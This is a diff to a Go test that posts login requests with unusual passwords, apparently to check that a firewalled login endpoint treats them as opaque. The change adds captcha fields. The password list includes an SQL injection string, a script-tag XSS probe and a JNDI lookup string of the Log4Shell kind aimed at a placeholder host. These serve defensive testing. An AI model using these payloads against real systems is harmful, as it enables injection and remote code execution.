@@ -14,7 +14,7 @@ func TestPinnedWAFRequestsAndOpaquePasswords(t *testing.T) {
 		t.Fatal(err)
 	}
 	for _, password := range []string{"中文复杂密码 O'Reilly <>&", "' OR 1=1; SELECT password FROM users --", "<script>alert(1)</script>", "${jndi:ldap://synthetic.invalid/a}"} {
-		data, _ := json.Marshal(map[string]any{"username": "中文用户", "password": password, "issue_token": false})
+		data, _ := json.Marshal(map[string]any{"username": "中文用户", "password": password, "issue_token": false, "captcha_id": "0123456789abcdef0123456789abcdef0123456789abcdef", "captcha_answer": "12345"})
 		r := httptest.NewRequest("POST", "https://192.0.2.1/api/v1/auth/login", bytes.NewReader(data))
 		r.Header.Set("User-Agent", "HMI-test")
 		r.Header.Set("Accept", "application/json")
